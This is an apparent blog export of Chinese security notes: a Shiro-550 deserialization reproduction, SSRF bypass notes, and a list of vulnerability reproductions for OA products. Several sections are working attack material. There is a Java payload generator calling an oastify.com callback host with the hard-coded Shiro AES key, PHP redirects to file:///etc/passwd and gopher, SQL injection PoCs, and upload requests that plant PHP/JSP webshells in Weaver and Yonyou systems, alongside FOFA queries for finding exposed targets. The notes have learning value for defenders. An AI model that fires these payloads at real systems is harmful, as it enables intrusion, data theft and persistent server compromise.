<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>shiro550分析复现</title>
    <url>/2023/06/12/shiro%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>



<p>找到shiro&#x2F;samples&#x2F;web里面的pom.xml，把jstl的版本改成1.2</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配一下tomcat，启动</p>
<h3 id="看登录逻辑"><a href="#看登录逻辑" class="headerlink" title="看登录逻辑"></a>看登录逻辑</h3><p>看一下登录包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164707912.png" alt="image-20230612164707912"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164815088.png" alt="image-20230612164815088"></p>
<p>shiro登录逻辑是，点击remmerberme之后</p>
<p>第一个请求的返回会给一串set-cookie，进行重定向</p>
<p>然后你用这个cookie值在请求重定向后的网页</p>
<h4 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h4><p>去看源码，找一下cookie</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171725697.png" alt="image-20230612171725697"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171735017.png" alt="image-20230612171735017"></p>
<p>往下看，能看到base64编码</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172015492.png" alt="image-20230612172015492"></p>
<p>看看哪里调用了这个方法</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172106578.png" alt="image-20230612172106578"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172125292.png" alt="image-20230612172125292"></p>
<p>找到这个decrypt()，进去，找到getCipherService()</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172603128.png" alt="image-20230612172603128"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172616571.png" alt="image-20230612172616571"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172626606.png" alt="image-20230612172626606"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172644597.png" alt="image-20230612172644597"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172718535.png" alt="image-20230612172718535"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612172725265.png" alt="image-20230612172725265">发现key是常量</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612214512006.png" alt="image-20230612214512006"></p>
<p>iv是随便取的</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>bp起一个监听collaborator (dnslog)，java生成poyload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://y65fxv6rch5rzwh0fcrxf3awangd42.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    hashCodeField.set(url,<span class="number">1234</span>);</span><br><span class="line">    hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    hashCodeField.set(url,-<span class="number">1</span>);</span><br><span class="line">    serialize(hashmap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python实现aes加密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加密脚本</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment"># plaintext = bytes.decode(plaintext)</span></span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># enc_data = b&quot;AALv9ZLoHe8dKEtIeH7y/2i9M9S70eanvsGbaN+DYSInYaw1cjtZvWNhXegmgP2DLI+VHLIxBrahwOUK4XNB2Vr</span></span><br><span class="line">    <span class="comment"># plaintext = aes_dec(enc_data)</span></span><br><span class="line">    <span class="comment"># print(plaintext)</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure>

<p>直接复制到流量包是不会走到反序列化的流程里的，要把sessionid删掉，不删是这样</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614143021221.png" alt="image-20230614143021221"></p>
<p>删了之后就是这个</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614142555692.png" alt="image-20230614142555692"></p>
<p>回看bp的监听</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614143829553.png" alt="image-20230614143829553"></p>
<p>已经弹回来了</p>
<h3 id="自查检测工具"><a href="#自查检测工具" class="headerlink" title="自查检测工具"></a>自查检测工具</h3><p><a href="https://shiro.sumsec.me/">https://shiro.sumsec.me/</a></p>
<p>参考链接：<a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<h3 id="cc链（正在写）"><a href="#cc链（正在写）" class="headerlink" title="cc链（正在写）"></a>cc链（正在写）</h3><blockquote>
<p>cc:<a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads</a></p>
</blockquote>
<p>pom添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>











]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf笔记</title>
    <url>/2023/06/12/ssrf%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><h4 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h4><h5 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h5><p>通过url 地址分享文章，例如如下地址:</p>
<p><a href="http://share.xxx.com/index.?url=http://127.0.0.1">http://share.xxx.com/index.?url=http://127.0.0.1</a></p>
<p>通过ur参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与</p>
<p>限制则就存在着SSRF漏洞。</p>
<h5 id="图片加载与下载"><a href="#图片加载与下载" class="headerlink" title="图片加载与下载"></a>图片加载与下载</h5><p>通过URL地址加载或下载图片</p>
<p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p>
<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF</p>
<h5 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h5><p><a href="http://title.xxx.com/title?title=file://etc/passwd">http://title.xxx.com/title?title=file://etc/passwd</a></p>
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF.</p>
<p><strong>代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS,xml,</strong></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器发送的，从而来判断是否存在SSRF漏洞。，</p>
<p>如果网站访问的百度页面，抓包的内容组并没有请求百度，那就说明请求是由服务器发出的，存在ssrf漏洞</p>
<h5 id="SSRF常用协议"><a href="#SSRF常用协议" class="headerlink" title="SSRF常用协议"></a>SSRF常用协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///  看文件，端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">dict://   端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">sftp://  传输</span><br><span class="line"></span><br><span class="line">ftp://</span><br><span class="line"></span><br><span class="line">tftp://  </span><br><span class="line"></span><br><span class="line">ldap://  轻量级目录访问</span><br><span class="line"></span><br><span class="line">gopher://   万金油</span><br></pre></td></tr></table></figure>

<h5 id="常见触发参数名"><a href="#常见触发参数名" class="headerlink" title="常见触发参数名"></a>常见触发参数名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">share	wap	url	link	src	source</span><br><span class="line"></span><br><span class="line">target	u	3g	display	sourceURI</span><br><span class="line"></span><br><span class="line">imageURL	domain</span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><strong>@绕过</strong> </p>
<p><a href="http://www.cbaidu/">http://www.baidu</a><a href="mailto:&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a>:8080</p>
<p><strong>ip地址转换成进制</strong>绕过</p>
<p>ping 2130706433</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35329361/1685932689118-1545318e-a582-4769-b926-3bb6b69527ad.png" alt="img"></p>
<p>127.0.0.1先转换成2进制，去掉小数点在转回十进制</p>
<p><strong>302 redirect</strong>绕过</p>
<p>当url存在临时(302)永久(301)跳转时，则继续请求跳转后的url，那么我们可以通过http的连接302跳转到gopher协议上</p>
<p>ssrf限制只能用http或者https协议时，可以通过header函数绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:file:///etc/passwd&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:dict://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:gopher://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xip.io</strong>绕过</p>
<p>dns解析这个host时会自动去掉后缀</p>
<p><a href="http://10.0.0.1.xip.io/">http://10.0.0.1.xip.io</a> &#x3D; 10.0.0.1</p>
<p><a href="http://www.10.0.0.1.xip.io/">www.10.0.0.1.xip.io</a>   &#x3D; 10.0.0.1</p>
<p><a href="http://mysite.10.0.0.1.xip.io=10.0.0.1">http://mysite.10.0.0.1.xip.io=10.0.0.1</a></p>
<p>foo.<a href="http://bar.10.0.0.1.xip.io/">http://bar.10.0.0.1.xip.io</a> &#x3D;10.0.0.1</p>
<p>10.0.0.1.xip.name resolves to 10.0.0.1</p>
<p><a href="http://www.10.0.0.2.xip.name/">www.10.0.0.2.xip.name</a> resolves to 10.0.0.2</p>
<p>foo.10.0.0.3.xip.name resolves to 10.0.0.3</p>
<p>bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</p>
<p><strong>封闭式字母数字</strong>绕过</p>
<p> ⓗ  ⓣ   ⓣ  Ⓟ  Ⓔ      &#x3D; <a href="http://example.com/">http://example.com</a></p>
<p>封闭式字母数字网址 <a href="https://haomeili.net/ZhiShi/34">https://haomeili.net/ZhiShi/34</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">diverse = <span class="string">&#x27;&#x27;&#x27;①②③④⑤⑥⑦⑧⑨⑴⑵⑶⑷⑸⑹⑺⑻⑼⒈⒉⒊⒋⒌⒍⒎⒏⒐⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓵⓶⓷⓸⓹⓺⓻⓼⓽&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">general = <span class="string">&#x27;&#x27;&#x27;123456789123456789123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 创建转换表</span></span><br><span class="line">decode = <span class="built_in">str</span>.maketrans(diverse, general)</span><br><span class="line">encode = <span class="built_in">str</span>.maketrans(general, diverse)</span><br><span class="line"><span class="comment"># 定义一个字符串</span></span><br><span class="line">text = <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line"><span class="comment"># 使用转换表进行加密</span></span><br><span class="line">new_text = text.translate(encode)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(new_text)</span><br></pre></td></tr></table></figure>

<p> <strong>DNS rebinding</strong>  </p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞复现</title>
    <url>/2023/06/13/%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><h4 id="php-cgi的远程代码执行漏洞-CVE-2012-1823"><a href="#php-cgi的远程代码执行漏洞-CVE-2012-1823" class="headerlink" title="php-cgi的远程代码执行漏洞(CVE-2012-1823)"></a>php-cgi的远程代码执行漏洞(CVE-2012-1823)</h4><p>影响版本</p>
<p>5.3.12&lt;php&lt;5.4.2</p>
<p>流量包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1687000658571.png" alt="1687000658571"></p>
<p>url部分为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="comment"># +号是空格 %3d是=  %3a是：</span></span><br><span class="line">/?-d allow_url_include=on -d auto_prepend_file=php://input</span><br></pre></td></tr></table></figure>

<p>通过该漏洞来修改WEB服务器的相关配置（本次攻击是为了开启allow_url_include、auto_prepend_file配置），从而使得一些远程执行代码的功能得以实现。</p>
<p>简单来说，这个特殊请求的功能就是使后面的POST数据能以PHP文件格式执行</p>
<h3 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h3><h4 id="宏景"><a href="#宏景" class="headerlink" title="宏景"></a>宏景</h4><h5 id="HR系统-CNVD-2023-08743"><a href="#HR系统-CNVD-2023-08743" class="headerlink" title="HR系统 CNVD-2023-08743"></a>HR系统 CNVD-2023-08743</h5><h6 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body = &#x27;&lt;div class=&quot;hj-hy-all-one-logo&quot;&#x27;</span><br></pre></td></tr></table></figure>

<h6 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/servlet/codesettree?categories=（Hrms编码之后的sql语句）&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>hrms加解密工具 <a href="https://github.com/vaycore/HrmsTool">https://github.com/vaycore/HrmsTool</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613105103117.png" alt="image-20230613105103117"></p>
<p>java -jar hrmsTool.jar -e  “1’ union all select ‘hongjing’,@@version–”</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1 HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<h4 id="泛微"><a href="#泛微" class="headerlink" title="泛微"></a>泛微</h4><h5 id="E-Cology-FileDownloadForOutDoc-SQL注入"><a href="#E-Cology-FileDownloadForOutDoc-SQL注入" class="headerlink" title="E-Cology   FileDownloadForOutDoc  SQL注入"></a>E-Cology   FileDownloadForOutDoc  SQL注入</h5><h6 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ecology 9.x 补丁版本 &lt; 10.58.0</span><br><span class="line">Ecology 8.x 补丁版本 &lt; 10.58.0</span><br></pre></td></tr></table></figure>

<p>fofa语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;泛微-协同办公OA&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close        </span><br><span class="line"></span><br><span class="line">fileid=2+WAITFOR DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml">https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml</a></p>
<h5 id="Weaver-E-Office9"><a href="#Weaver-E-Office9" class="headerlink" title="Weaver E-Office9"></a>Weaver E-Office9</h5><h6 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地测试环境 v9.0</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230809134631494.png" alt="image-20230809134631494"></p>
<h6 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /inc/jquery/uploadify/uploadify.php HTTP/1.1</span><br><span class="line">Host: 192.168.232.137:8082</span><br><span class="line">User-Agent: <span class="built_in">test</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 493</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="line"> </span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;Filedata&quot;</span>; filename=<span class="string">&quot;666.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"> </span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"> </span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"> </span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></pre></td></tr></table></figure>



<p>访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.232.137:8082/attachment/2133360589/666.php</span><br></pre></td></tr></table></figure>

<h4 id="通达OA"><a href="#通达OA" class="headerlink" title="通达OA"></a>通达OA</h4><h5 id="SQL注入（CVE-2023-4165）"><a href="#SQL注入（CVE-2023-4165）" class="headerlink" title="SQL注入（CVE-2023-4165）"></a>SQL注入（CVE-2023-4165）</h5><h6 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通达OA ≤ v11.10，v2017</span><br></pre></td></tr></table></figure>

<h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入路由：general/system/seal_manage/iweboffice/delete_seal.php</span><br><span class="line">注入参数：DELETE_STR</span><br></pre></td></tr></table></figure>

<h6 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1</span><br></pre></td></tr></table></figure>



<h4 id="用友"><a href="#用友" class="headerlink" title="用友"></a>用友</h4><h5 id="GRP-U8-存在任意文件上传漏洞"><a href="#GRP-U8-存在任意文件上传漏洞" class="headerlink" title="GRP-U8 存在任意文件上传漏洞"></a>GRP-U8 存在任意文件上传漏洞</h5><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;用友-GRP-U8&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST http://127.0.0.1/UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=..%2F&amp;filename=94156577.jsp&amp;filename=1.jpg HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9</span><br><span class="line">Content-Type: multipart/form-data</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 177</span><br><span class="line"></span><br><span class="line">--ec126a48c5b7676dce1b676f5251358f</span><br><span class="line">Content-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line"></span><br><span class="line">&lt;% out.println(&quot;3135168535&quot;);%&gt;</span><br><span class="line">--ec126a48c5b7676dce1b676f5251358f--</span><br></pre></td></tr></table></figure>

<p> 上传成后webshell地址：<a href="http://127.0.0.1/R9iPortal/94156577.jsp">http://127.0.0.1/R9iPortal/94156577.jsp</a></p>
